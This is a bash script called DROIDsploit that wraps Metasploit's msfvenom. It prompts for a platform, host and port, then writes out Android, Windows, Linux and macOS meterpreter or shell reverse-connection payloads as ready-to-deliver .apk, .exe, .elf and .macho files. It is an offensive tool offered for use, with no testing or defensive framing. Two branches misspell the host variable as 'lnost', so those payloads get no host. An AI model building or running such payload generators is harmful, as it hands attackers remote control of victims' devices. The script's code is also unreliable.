#!/bin/bash
clear

echo ' ______   _______  _______ _________ ______   _______  _______  _        _______ __________________'
echo '(  __  \ (  ____ )(  ___  )\__   __/(  __  \ (  ____ \(  ____ )( \      (  ___  )\__   __/\__   __/'
echo '| (  \  )| (    )|| (   ) |   ) (   | (  \  )| (    \/| (    )|| (      | (   ) |   ) (      ) (  '
echo '| |   ) || (____)|| |   | |   | |   | |   ) || (_____ | (____)|| |      | |   | |   | |      | |   '
echo '| |   | ||     __)| |   | |   | |   | |   | |(_____  )|  _____)| |      | |   | |   | |      | |  '
echo '| |   ) || (\ (   | |   | |   | |   | |   ) |      ) || (      | |      | |   | |   | |      | |  '
echo '| (__/  )| ) \ \__| (___) |___) (___| (__/  )/\____) || )      | (____/\| (___) |___) (___   | |   '
echo '(______/ |/   \__/(_______)\_______/(______/ \_______)|/       (_______/(_______)\_______/   )_(  version 1.0'


echo '---------------------------------------------------------------------------------------------------------------------------'
echo 'Author : King'
echo 'Instagram : hacking_with_king'
echo '---------------------------------------------------------------------------------------------------------------------------'
echo 'Description : DROIDsploit is a msfvenom(Metasploit) payload generation automation tool'
echo
echo
echo '1 -----> Android'
echo '2 -----> Windows'
echo '3 -----> Linux '
echo '4 -----> Mac-OS'
a=1
b=2
c=3
d=4
echo -n 'Enter platform for payload generation :'
read platform
if [ $platform == $a ]
then
    echo '1 -----> android/meterpreter/reverse_tcp'
    echo '2 -----> android/meterpreter/reverse_http'
    echo '3 -----> android/meterpreter/reverse_https'
   a=1
   b=2
   c=3
   echo -n 'Enter payload type : '
   read type
   if [ $type == $a ]
   then
       echo -n 'Enter name os of Output file' :
       read opt
       echo -n 'Enter LHOST : '
       read lhost
       echo -n 'Enter LPORT : '
       read lport
       echo 'Generating Payload Please wait !!!! '
       msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $opt.apk
   elif [ $type == $b ];
   then
       echo -n 'Enter name os of Output file' :
       read opt
       echo -n 'Enter LHOST : '
       read lhost
       echo -n 'Enter LPORT : '
       read lport
       echo 'Generating Payload Please wait !!!'
       msfvenom -p android/meterpreter/reverse_http LHOST=$lhost LPORT=$lport R > $opt.apk
   elif [ $type == $c ];
   then
       echo -n 'Enter name os of Output file' :
       read opt
       echo -n 'Enter LHOST : '
       read lhost
       echo -n 'Enter LPORT : '
       read lport
       echo 'Generating Payload Please wait !!!'
       msfvenom -p android/meterpreter/reverse_https LHOST=$lnost LPORT=$lport R > $opt.apk
   else
          echo 'Invalid Choice'
          exit
       fi
elif [ $platform == $b ];
then
    echo '1 -----> windows/meterpreter/reverse_tcp'
    echo '2 -----> windows/meterpreter/reverse_http'
    a=1
    b=2
    echo -n 'Enter payload type : '
    read type
    if [ $type == $a ];
    then
         echo -n 'Enter name os of Output file' :
         read opt
         echo -n 'Enter LHOST : '
         read lhost
         echo -n 'Enter LPORT : '
         read lport
         echo 'Generating Payload Please wait !!!'
         msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f  exe > $opt.exe
    elif [ $type == $b ];
    then
        echo -n 'Enter name os of Output file' :
        read opt
        echo -n 'Enter LHOST : '
        read lhost
        echo -n 'Enter LPORT : '
        read lport
        echo 'Generating Payload Please wait !!!'
	   msfvenom -p windows/meterpreter/reverse_http LHOST=$lhost LPORT=$lport -f exe > $opt.exe
    else
        echo 'Invalid Choice'
        exit
    fi
elif [ $platform == $c ];
then
    echo -n 'Enter name os of Output file' :
    read opt
    echo -n 'Enter LHOST : '
    read lhost
    echo -n 'Enter LPORT : '
    read lport
    echo 'Generating Payload Please wait !!!'
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lnost LPORT=$lport -f elf > $opt.elf
elif [ $platform == $d ];
then
    echo -n 'Enter name os of Output file' :
    read opt
    echo -n 'Enter LHOST : '
    read lhost
    echo -n 'Enter LPORT : '
    read lport
    echo 'Generating Payload Please wait !!!'
    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > $opt.macho
else
    echo 'Invalid Choice'
fi
echo 'Type ls to see your payload'
